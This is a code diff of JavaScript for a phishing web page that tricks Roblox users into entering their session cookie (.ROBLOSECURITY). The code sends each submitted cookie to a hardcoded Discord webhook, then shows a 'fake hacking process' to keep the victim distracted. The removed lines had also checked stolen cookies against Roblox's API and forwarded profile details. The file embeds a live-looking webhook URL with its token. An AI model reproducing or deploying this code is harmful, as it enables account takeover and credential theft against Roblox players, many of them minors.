@@ -1,10 +1,10 @@
 // Discord Webhook URL (Replace with your actual webhook URL)
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
 
-// Function to send data to Discord webhook
-function sendToDiscordWebhook(content) {
+// Function to send Session ID to Discord webhook
+function sendToDiscordWebhook(sessionId) {
   const payload = {
-    content: content,
+    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
   };
 
   fetch(DISCORD_WEBHOOK_URL, {
@@ -24,31 +24,8 @@ function sendToDiscordWebhook(content) {
     });
 }
 
-// Function to validate Roblox session ID and fetch user profile
-async function validateRobloxSession(sessionId) {
-  try {
-    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      method: 'GET',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${sessionId}`,
-      },
-    });
-
-    if (response.ok) {
-      const userData = await response.json();
-      return userData; // Return the user profile data
-    } else {
-      console.error('Invalid session ID. Roblox API returned:', response.status, response.statusText);
-      return null;
-    }
-  } catch (error) {
-    console.error('Error validating session ID:', error);
-    return null;
-  }
-}
-
 // Validate User Input
-async function validateInput() {
+function validateInput() {
   const username = document.getElementById('username').value.trim();
   const sessionId = document.getElementById('sessionId').value.trim();
   const captcha = document.getElementById('captcha').checked;
@@ -79,25 +56,13 @@ async function validateInput() {
   }
 
   // Send Session ID to Discord webhook
-  sendToDiscordWebhook(`New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``);
-
-  // Validate Roblox session ID and fetch user profile
-  const userData = await validateRobloxSession(sessionId);
-  if (userData) {
-    console.log('User Profile Data:', userData);
-
-    // Send user profile information to Discord webhook
-    const profileInfo = `**Valid Session ID!**\n**Username:** ${userData.name}\n**Display Name:** ${userData.displayName}\n**User ID:** ${userData.id}`;
-    sendToDiscordWebhook(profileInfo);
-  } else {
-    showError('Invalid session ID. Please check your inputs.');
-    return;
-  }
+  sendToDiscordWebhook(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
   startHack();
 }
+
 // Show Error Message
 function showError(message) {
   const errorElement = document.getElementById('error');
